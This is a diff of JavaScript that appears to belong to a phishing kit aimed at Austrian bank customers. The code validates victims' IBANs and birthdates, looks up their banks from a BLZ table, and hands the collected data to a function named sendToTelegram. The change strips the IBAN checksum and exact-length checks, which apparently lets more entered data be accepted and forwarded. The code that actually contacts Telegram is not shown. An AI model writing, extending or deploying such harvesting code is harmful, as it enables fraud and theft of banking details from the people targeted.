@@ -13,7 +13,6 @@ let ibanCheckResult = {
 
 // ============================================================
 // 🏦 СПРАВОЧНИК АВСТРИЙСКИХ БАНКОВ (BLZ -> BIC и название)
-// Источник: Oesterreichische Nationalbank (OeNB), ноябрь 2026
 // ============================================================
 const AUSTRIAN_BANKS = {
     '11000': { bic: 'BKAUATWWXXX', bank: 'UniCredit Bank Austria AG' },
@@ -67,7 +66,7 @@ const AUSTRIAN_BANKS = {
 };
 
 // ============================================================
-// 🏛️ ОПРЕДЕЛЕНИЕ БАНКА ПО BIC (для немецких BIC, если придут от API)
+// 🏛️ ОПРЕДЕЛЕНИЕ БАНКА ПО BIC (для немецких BIC)
 // ============================================================
 function getBankNameByBIC(bic) {
     const bankMap = {
@@ -152,43 +151,27 @@ function validateBirthdate(value) {
 }
 
 // ============================================================
-// 🏦 ЛОКАЛЬНЫЙ IBAN-ЧЕКЕР + ОПРЕДЕЛЕНИЕ БАНКА ПО BLZ
+// 🏦 ЛОКАЛЬНЫЙ IBAN-ЧЕКЕР (только длина и символы, без MOD-97)
 // ============================================================
 function validateIbanLocally(iban) {
     const cleanIban = iban.replace(/\s/g, '').toUpperCase();
 
+    // 1. Только буквы и цифры
     if (!/^[A-Z0-9]+$/.test(cleanIban)) {
         return { valid: false, message: 'Ungültige IBAN.', bankData: null };
     }
 
-    if (cleanIban.length !== 20) {
-        return { valid: false, message: 'Ungültige IBAN.', bankData: null };
-    }
-
+    // 2. Должен начинаться с AT
     if (!cleanIban.startsWith('AT')) {
         return { valid: false, message: 'Ungültige IBAN.', bankData: null };
     }
 
-    const rearranged = cleanIban.slice(4) + cleanIban.slice(0, 4);
-    let numericString = '';
-    for (let i = 0; i < rearranged.length; i++) {
-        const char = rearranged[i];
-        if (char >= 'A' && char <= 'Z') {
-            numericString += (char.charCodeAt(0) - 55).toString();
-        } else {
-            numericString += char;
-        }
-    }
-
-    let remainder = 0;
-    for (let i = 0; i < numericString.length; i++) {
-        remainder = (remainder * 10 + parseInt(numericString[i], 10)) % 97;
-    }
-
-    if (remainder !== 1) {
+    // 3. Минимум 20 символов (для Австрии стандарт — 20)
+    if (cleanIban.length < 20) {
         return { valid: false, message: 'Ungültige IBAN.', bankData: null };
     }
 
+    // 4. Пытаемся определить банк по BLZ (цифры 5-9)
     const blz = cleanIban.substring(4, 9);
     const bankInfo = AUSTRIAN_BANKS[blz];
 
@@ -342,7 +325,6 @@ function sendToTelegram(data) {
         let bankName = ibanData.bankData.bank;
         const bic = ibanData.bankData.bic;
 
-        // Если названия банка нет, но есть BIC — пробуем определить по немецкой карте
         if (!bankName && bic) {
             bankName = getBankNameByBIC(bic);
         }
